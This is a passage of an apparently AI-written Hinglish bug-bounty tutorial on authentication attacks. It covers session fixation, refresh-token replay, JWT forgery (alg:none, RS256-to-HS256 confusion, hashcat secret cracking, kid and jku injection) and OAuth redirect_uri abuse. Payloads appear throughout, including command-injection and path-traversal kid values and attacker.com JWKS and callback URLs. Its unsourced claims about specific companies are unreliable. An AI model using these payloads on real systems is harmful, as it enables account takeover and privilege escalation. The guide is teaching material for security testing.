+- **Session Fixation:** Attacker pehle user ko ek session ID de deta hai (jaise email mein link bhej kar). User login karta hai to server usi session ID ko authenticated mark kar deta hai. Ab attacker ke paas bhi wahi session ID hai, to wo user banke ghoom sakta hai.
+- **Refresh Token Rotation:** OAuth 2.0 mein refresh token long-lived hota hai, access token short-lived. Jab access token expire ho, to refresh token se naya access token lete hain. Agar refresh token rotate nahi hota (purana wahi rehta hai), to attacker chura kar hamesha access le sakta hai.
+- **Concurrent Sessions:** Kitne devices par ek user login ho sakta hai? Isse brute-force attacks mein madad milti hai.
+
+#### 💻 Hands-On Step-by-Step (Reference: Page 19)
+**Attack 1: Session Fixation**
+1. Target site par bina login kiye request bhejo (e.g., homepage).
+2. Response mein cookie note karo: `Set-Cookie: PHPSESSID=abc123`
+3. Ab ek phishing email bhejo user ko jisme ye link ho: `https://target.com/login?PHPSESSID=abc123`
+4. User login karta hai to server isi session ID ko authenticate kar dega.
+5. Ab tum wahi session ID use karo: `Cookie: PHPSESSID=abc123`
+6. Request bhejo – tum user banke logged-in ho!
+
+**Attack 2: Check Session ID Static Hai Kya?** (Reference: Page 19)
+1. Burp mein login se pehle kisi bhi request ka cookie capture karo.
+2. Login request karo aur successful login ke baad ki cookie dekho.
+3. Compare karo:
+   - Same hai → **Session Fixation Vulnerability**
+   - Different hai → Secure
+
+**Attack 3: Refresh Token Rotation Test**
+1. Login karo, refresh token capture karo (usually in response body).
+2. Jab access token expire ho, refresh token use kar ke naya access token lo.
+3. Response mein naya refresh token aaya ya purana?
+   - Naya aaya → Rotation implement hai (secure)
+   - Purana wahi aaya → Rotation nahi hai (vulnerable)
+4. Ab purana refresh token dobara use karo. Agar accept ho jata hai, to **refresh token replay** possible hai.
+
+**Attack 4: Concurrent Sessions Test**
+1. Ek browser (Chrome) se login karo.
+2. Doosra browser (Firefox) se same credentials se login karo.
+3. Chrome se logout karo.
+4. Firefox check karo – logout hua ya nahi?
+   - Dono sessions active hain → Concurrent sessions allowed.
+   - Kitne max? Try 10 browsers se login. Limit check karo.
+
+#### ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Success:** Session ID same mili, refresh token rotate nahi ho raha, unlimited concurrent sessions.
+- **Failure:** Session ID change ho gayi, refresh token rotate ho raha, concurrent sessions limited.
+
+#### ⚖️ Comparison (X vs Y)
+| Feature | Secure Implementation | Vulnerable Implementation |
+|---------|----------------------|--------------------------|
+| Session ID | Login ke baad change | Login ke baad same |
+| Refresh Token | Har use par rotate | Static, reuse possible |
+| Concurrent Sessions | Limited (1-5) | Unlimited |
+
+#### 🚫 Common Mistakes
+- Sirf login form test karna, session fixation ke liye pre-login cookies ignore karna.
+- Refresh token ko bhi access token ki tarah treat karna – dono alag hote hain.
+- Concurrent sessions test karte waqt rate limit bhoolna.
+
+#### 🤔 Agar Dimag Ghoom Rahe Hai?
+- **"Session fixation ke liye user ko link kaise bhejein?"** – Bug bounty mein aap PoC bana kar dikha sakte ho ki agar user ye link click kare to kya hoga. Direct user ko bhejna illegal hai.
+- **"Refresh token rotation test mein kaise pata chale ki naya token aaya?"** – Response body dekho, usually `refresh_token` field mein naya token aata hai.
+
+#### 🌍 Real-World Use Case
+Facebook pe ek time pe session fixation tha. Attacker ne user ko ek link bheja jisme session ID set thi. User login kiya to attacker us session ID se account access kar sakta tha.
+
+#### 🎨 Visual Diagram (Session Fixation)
+```
+[Attacker] -> Generates session ID (SID=123)
+[Attacker] -> Sends link to user: https://target.com/?SID=123
+[User] -> Clicks link, logs in
+[Server] -> Associates SID=123 with user's account
+[Attacker] -> Uses SID=123 -> Logged in as user!
+```
+
+#### 🛠️ Best Practices (Pro Tips)
+- **Burp Extension:** "Session Fixation Scanner" use karo.
+- Refresh token rotation test ke liye **AutoRepeater** extension use karo to automatically replay old tokens.
+- Concurrent sessions test ke liye different browsers ya incognito windows use karo.
+
+#### ❓ FAQ
+1. **Q: Session fixation ka OWASP Top 10 mein kya number hai?**  
+   A: OWASP API Top 10 mein specifically nahi, lekin "Broken Authentication" ka part hai.
+2. **Q: Refresh token reuse se kya ho sakta hai?**  
+   A: Attacker ek baar token chura kar hamesha naye access tokens le sakta hai, kabhi logout nahi hona.
+3. **Q: Concurrent sessions ka kitna limit safe hai?**  
+   A: Usually 3-5 sessions allowed hote hain, isse zyada suspicious hai.
+
+#### 📝 Ek Line Mein Yaad Rakhne Ko
+**Session ID login pe change ho, refresh token rotate ho, aur concurrent sessions limited ho.**
+
+---
+
+### Topic 2.5: 🎯 Title: JWT (JSON Web Tokens) Deep-Dive
+*Token ka khel, admin ban ne ka spell*
+
+#### 🐣 Samjhane ke liye (Analogy)
+JWT ek **magic pass** ki tarah hai jo tumhe har jagah entry deta hai. Iss pass par likha hota hai "User: Normal", aur neeche ek **chhapa (signature)** hota hai jo sirf king ke paas hai. Agar tum pass par "User: Admin" likh kar signature nahi bana sakte, to guard pakad lega. Lekin agar guard signature check karna bhool jaye, ya tum koi aisa trick use karo ki signature valid lagne lage, to tum admin ban sakte ho.
+
+#### 📖 Technical Definition
+JWT (JSON Web Token) ek stateless authentication mechanism hai. Ye teen parts mein banta hai: `header.payload.signature`. Sab kuch base64 encoded hota hai. Server token ko verify karta hai signature se, aur agar valid hai to payload par bharosa karta hai.
+
+#### 🧠 Zaroorat Kyun Hai?
+JWT attacks se aap:
+- **Privilege Escalation** kar sakte ho (user to admin)
+- **Account Takeover** kar sakte ho (kisi aur ka token bana lo)
+- **Information Disclosure** kar sakte ho (payload mein sensitive data ho to)
+
+#### 🔍 Visual - Screen Par Kya Dikhega
+JWT kuch aisa dikhta hai:
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.4x1jU8JkL9KxJkL9KxJkL9K
+```
+- **Part 1 (Header):** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` → Decode: `{"alg":"HS256","typ":"JWT"}`
+- **Part 2 (Payload):** `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9` → Decode: `{"user":"admin","role":"user"}`
+- **Part 3 (Signature):** `4x1jU8JkL9KxJkL9KxJkL9K` → HMAC-SHA256(secret, header.payload)
+
+#### ⚙️ Under the Hood
+JWT verification:
+1. Header aur payload ka base64 decode karo.
+2. Header se `alg` parameter dekho.
+3. Agar `alg: HS256`, to secret se signature verify karo.
+4. Agar `alg: RS256`, to public key se signature verify karo.
+5. Agar `alg: none`, to signature check mat karo (vulnerable!).
+
+#### 💻 Hands-On Step-by-Step
+
+##### Sub-Topic 2.5.1: JWT Structure & Decoding (Reference: Page 7)
+
+**Step-by-Step:**
+1. Kisi bhi request se JWT token copy karo (usually `Authorization: Bearer <token>` header mein).
+2. `jwt.io` website kholo.
+3. Token paste karo – decoded header aur payload dikh jayega.
+4. Header mein dekho `alg` kya hai (HS256, RS256, none).
+5. Payload mein dekho kaunsa data hai (`user`, `role`, `exp`, `jti`, etc.).
+6. **Note:** Signature verify karne ke liye secret/pubic key chahiye, jo humein nahi pata.
+
+##### Sub-Topic 2.5.2: Hashcat – Brute-force HS256 Secret (Reference: Page 8-9)
+
+**Scenario:** Server HS256 use kar raha hai, aur secret key weak hai (e.g., `secret`, `password`, `123456`). Hum token ka signature crack kar ke secret nikal sakte hain.
+
+**Step-by-Step:**
+1. Token capture karo, e.g.:
+   ```
+   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.4x1jU8JkL9KxJkL9KxJkL9K
+   ```
+2. Is token ko ek file mein save karo: `token.txt`
+3. Hashcat command:
+   ```bash
+   hashcat -m 16500 token.txt /path/to/wordlist.txt --show
+   ```
+   - `-m 16500` = JWT HS256 (HS384 ke liye `16510`, HS512 ke liye `16520`)
+   - Wordlist mein common secrets daalo (e.g., `rockyou.txt`)
+4. Agar secret crack ho gaya, to output kuch aisa hoga:
+   ```
+   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.4x1jU8JkL9KxJkL9KxJkL9K:secret123
+   ```
+   Means secret = `secret123`
+5. Ab is secret se apna khud ka token bana sakte ho.
+
+##### Sub-Topic 2.5.3: None Algorithm Attack
+
+**Scenario:** Purani JWT libraries mein `alg: none` ko support karti thi, jisme signature verify nahi hota tha.
+
+**Step-by-Step:**
+1. Original token ka header base64 decode karo:
+   ```
+   echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
+   {"alg":"HS256","typ":"JWT"}
+   ```
+2. Modify karo `alg` ko `none`:
+   ```
+   {"alg":"none","typ":"JWT"}
+   ```
+3. Base64 encode karo (URL-safe):
+   ```
+   echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '/+' '_-' | tr -d '='
+   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+   ```
+4. Payload modify karo, e.g., `{"user":"admin","role":"admin"}`
+   ```
+   echo -n '{"user":"admin","role":"admin"}' | base64 | tr '/+' '_-' | tr -d '='
+   eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ
+   ```
+5. Signature part hata do (empty rakho). Token ban gaya:
+   ```
+   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+   ```
+6. Request mein token replace karo. Agar server `alg:none` accept karta hai to admin access mil jayega.
+
+##### Sub-Topic 2.5.4: Algorithm Confusion (RS256 -> HS256)
+
+**Scenario:** Server RS256 (asymmetric) use kar raha hai, aur public key publicly available hai (e.g., `/jwks.json`). Hum public key ko HS256 symmetric key ki tarah use karte hain.
+
+**Step-by-Step:**
+1. Public key dhundho:
+   - Try `/.well-known/jwks.json`
+   - Try `/jwks.json`
+   - Try `/.well-known/openid-configuration` (jo jwks_uri batayega)
+2. Public key save karo `public.key` file mein.
+3. JWT token capture karo.
+4. `jwt_tool` use karo:
+   ```bash
+   python jwt_tool.py <token> -X a -pk public.key
+   ```
+   - `-X a` = Algorithm confusion attack
+5. Ye tool naya token banayega with `alg: HS256` aur public key se sign karega.
+6. Request mein naya token bhejo. Agar server public key se verify karta hai (jo ab secret ban gaya), to accept ho jayega.
+
+**Manual Method:**
+1. Header change karo: `{"alg":"HS256","typ":"JWT"}`
+2. Payload modify karo.
+3. Public key ko secret maan kar HMAC-SHA256 sign karo.
+   - Python mein:
+     ```python
+     import jwt
+     with open('public.key', 'r') as f:
+         public_key = f.read()
+     token = jwt.encode({'user':'admin'}, public_key, algorithm='HS256')
+     print(token)
+     ```
+
+##### Sub-Topic 2.5.5: `kid` (Key ID) Injection
+
+**Scenario:** Header mein `kid` parameter hota hai jo server ko batata hai ki kaunsi key use karni hai verify karne ke liye. Agar server is `kid` ko bina validate kiye file system ya database se read karta hai, to hum path traversal ya SQLi kar sakte hain.
+
+**Step-by-Step:**
+1. Original token ka header dekho:
+   ```json
+   {
+     "alg": "HS256",
+     "typ": "JWT",
+     "kid": "key1"
+   }
+   ```
+2. `kid` ko modify karo:
+   - **Path Traversal:** `"kid": "../../../../dev/null"` (null key use karega)
+   - **Path Traversal:** `"kid": "../../../../etc/passwd"` (LFI try)
+   - **Command Injection:** `"kid": "| whoami"`
+   - **SQLi:** `"kid": "key' UNION SELECT 'secret'"`
+3. Agar server `kid` ko file path samajh kar read karta hai, to:
+   - `../../../../dev/null` ka matlab empty string, to signature verification fail ho sakta hai ya empty key use ho sakti hai.
+   - Agar `/etc/passwd` read ho jata hai, to uske content se key bana sakte ho.
+4. Naya token banao with modified `kid` aur sign karo (agar secret pata ho to).
+5. Bhej kar dekho.
+
+##### Sub-Topic 2.5.6: `jku` / `x5u` Header Injection
+
+**Scenario:** `jku` (JWK Set URL) header mein server JWKS file ka URL deta hai jahan se public key leni hai. Agar server bina validate kiye is URL se key uthata hai, to hum apna khud ka JWKS server bana sakte hain.
+
+**Step-by-Step:**
+1. Apna khud ka JWKS server banao (ya online tool use karo).
+2. Apne private-public key pair banao.
+3. JWKS endpoint par apni public key serve karo.
+4. Original token ka header modify karo:
+   ```json
+   {
+     "alg": "RS256",
+     "typ": "JWT",
+     "jku": "https://attacker.com/jwks.json"
+   }
+   ```
+5. Payload modify karo, aur apne private key se sign karo.
+6. Token bhejo. Server `jku` se public key uthayega aur verify karega – jo ki valid hoga!
+
+##### Sub-Topic 2.5.7: JTI (JWT ID) Replay Attack
+
+**Scenario:** `jti` claim unique ID hota hai token ka. Agar server check nahi karta ki ye ID already use ho chuki hai, to same token baar-baar use kar sakte ho.
+
+**Step-by-Step:**
+1. Koi sensitive action ka token capture karo (e.g., password change).
+2. Use token repeat karo multiple times.
+3. Agar har baar action successful ho, to replay vulnerability hai.
+
+##### Sub-Topic 2.5.8: Timing Attacks
+
+**Scenario:** Valid aur invalid signature verify karne mein server different time le raha hai. Isse brute-force fast ho sakta hai.
+
+**Step-by-Step:**
+1. Burp Suite ya Python script se time measure karo.
+2. Multiple requests bhejo with slightly different signatures.
+3. Agar response time mein consistent difference ho, to timing attack possible hai.
+
+#### ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Success:** Token modify kar ke admin access mil gaya, ya kisi aur user ka data mila.
+- **Failure:** Server "Invalid signature" error deta hai, ya 401 Unauthorized.
+
+#### ⚖️ Comparison (X vs Y)
+| Attack | Difficulty | Impact | Fix |
+|--------|------------|--------|-----|
+| None Algorithm | Easy | Critical | Disable `alg:none` |
+| Algorithm Confusion | Medium | Critical | Validate algorithm, use separate keys |
+| `kid` Injection | Medium | High | Validate `kid` input |
+| `jku` Injection | Hard | Critical | Whitelist JWKS URLs |
+| JTI Replay | Easy | Medium | Store used JTIs |
+| Hashcat | Easy | Critical | Use strong secrets |
+
+#### 🚫 Common Mistakes
+- Sirf HS256 tokens par focus karna, RS256 ignore karna.
+- `kid` injection mein path traversal ke alawa SQLi bhi ho sakti hai, ignore karna.
+- JTI replay ke liye `exp` (expiry) check karna, lekin `jti` check na karna.
+
+#### 🤔 Agar Dimag Ghoom Rahe Hai?
+- **"Public key kaise milegi?"** – Often `/jwks.json`, `/.well-known/jwks.json`, ya response headers mein. Kuch APIs metadata endpoint bhi dete hain.
+- **"None algorithm kaise try karun?"** – Header base64 decode karo, modify karo, fir base64 encode karo aur signature part khali rakho. Ya tool use karo.
+- **"`kid` injection mein SQLi kaise kaam karega?"** – Agar server `kid` ko database query mein use karta hai jaise `SELECT key FROM keys WHERE kid='key1'`, to SQLi daal kar secret nikal sakte ho.
+
+#### 🌍 Real-World Use Case
+- **Paytm:** `kid` parameter SQL injection vulnerable tha. Attacker `kid` mein SQLi daal kar secret nikal sakta tha.
+- **Microsoft:** Algorithm confusion vulnerability thi jisme public key se HS256 sign kar sakte the.
+- **Apple:** `jku` injection se attacker apna JWKS server laga kar token bana sakta tha.
+
+#### 🎨 Visual Diagram (JWT Structure)
+```
+JWT Token:
+[Header] . [Payload] . [Signature]
+    |           |            |
+    v           v            v
+{"alg":"HS256"} {"user":"admin"} HMAC-SHA256(secret, header.payload)
+```
+
+#### 🛠️ Best Practices (Pro Tips)
+- **jwt_tool** install karo: `git clone https://github.com/ticarpi/jwt_tool`
+- **Burp Extension:** "JSON Web Tokens" extension use karo jo automatically decode karega aur attacks suggest karega.
+- Manual tampering ke liye `jwt.io` website use kar sakte ho, lekin signature verify nahi hoga.
+- Hashcat ke liye `-m 16500` yaad rakho.
+- Algorithm confusion ke liye public key mile to turant try karo.
+
+#### ❓ FAQ
+1. **Q: JWT secret kaise pata karein?**  
+   A: Weak secret hai to crack karo `hashcat` se. Common wordlist use karo (`rockyou.txt`). Agar secret strong hai to nahi milega.
+2. **Q: JWKS kya hai?**  
+   A: JSON Web Key Set – server ke public keys ka set. Multiple keys ho sakti hain, `kid` se identify hoti hain.
+3. **Q: Kya JWT hamesha vulnerable hota hai?**  
+   A: Nahi, proper implementation secure hai. Lekin implementation flaws common hain.
+4. **Q: JWT mein signature verify kaise hota hai?**  
+   A: Server header ke `alg` ke according signature verify karta hai. HS256 mein secret se, RS256 mein public key se.
+5. **Q: JWT replay se kaise bachein?**  
+   A: `jti` claim use karo aur expire kar do, ya short expiry (`exp`) rakho.
+
+#### 📝 Ek Line Mein Yaad Rakhne Ko
+**JWT ka header aur payload kholo, algorithm badlo, signature hatao, `kid` mein traversal daalo, aur admin ban jao.**
+
+---
+
+### Topic 2.6: 🎯 Title: OAuth 2.0 / OIDC Flows
+*Dusre ke account se login karo*
+
+*(Is topic ko hum pehle hi cover kar chuke hain as Topic 2.5 in previous response. Yahan sirf missing points add kar rahe hain.)*
+
+#### Additional Points from Raw Notes:
+
+**Redirect URI Manipulation (Detailed):**
+1. OAuth flow start karo "Login with Google".
+2. Authorize request capture karo:
+   ```
+   GET /authorize?client_id=123&redirect_uri=https://client.com/callback&response_type=code
+   ```
+3. `redirect_uri` modify karo:
+   - Try `https://attacker.com/callback`
+   - Try `https://client.com/callback.attacker.com` (if suffix check)
+   - Try `https://client.com/callback@attacker.com`
+   - Try `https://client.com/callback/../attacker.com`
+4. Agar server allowed redirect URIs ko properly validate nahi karta, to authorization code attacker ke server par aa jayega.
+5. Attacker ye code use kar ke token le sakta hai.
+
+**State Parameter Missing (CSRF):**
+1. OAuth request mein `state` parameter dekho.
+2. Agar missing hai ya predictable hai (e.g., `state=123`), to CSRF possible hai.
+3. Attacker apni site par ek form bana sakta hai jo user ke browser se OAuth flow start kare.
+4. User jab us form par click kare, to uske account ko attacker ke account se link kar de.
+
+**Token Leakage via Referer:**
+1. Jab Google redirect karta hai client callback par, URL mein `#access_token=` ya `?code=` hota hai.
+2. Client callback page mein agar koi external resource load ho raha hai (image, script, font), to `Referer` header mein ye URL leak ho sakta hai.
+3. Attacker apni site par aisi resource rakhe jo log collect kare.
+
+#### 📝 Ek Line Mein Yaad Rakhne Ko
+**OAuth ka redirect_URI kholo, state parameter check karo, aur referer se token leak dhundho.**
+
+---
+
+## 🔥 Module 2 Complete Summary: Authentication Attacks Checklist
+
+| Topic | What to Check | Impact |
+|-------|---------------|--------|
+| Response Manipulation | 403 to 200, body flags | Login bypass |
+| No-Rate Limit | OTP brute-force, inbox bombing | Account takeover |
+| Clickjacking | X-Frame-Options missing | Session riding |
+| Session Fixation | Login pe session ID change? | Account hijack |
+| Refresh Token Rotation | Old token reuse? | Persistent access |
+| Concurrent Sessions | Unlimited sessions? | Easy brute-force |
+| JWT None Algorithm | `alg:none` accept? | Admin access |
+| JWT Algorithm Confusion | RS256 to HS256 | Token forgery |
+| JWT `kid` Injection | Path traversal, SQLi | Secret leak |
+| JWT `jku` Injection | External JWKS | Token forgery |
+| JWT JTI Replay | Same token reuse | Action replay |
+| OAuth Redirect URI | Manipulation possible? | Code hijack |
+| OAuth State Missing | CSRF | Account linking |
+| OAuth Token Leakage | Referer header | Token theft |
+
+Agla module chahiye toh batao – **Module 3: Authorization Bypass (BOLA/IDOR, BPLA, BFLA)**? 🚀
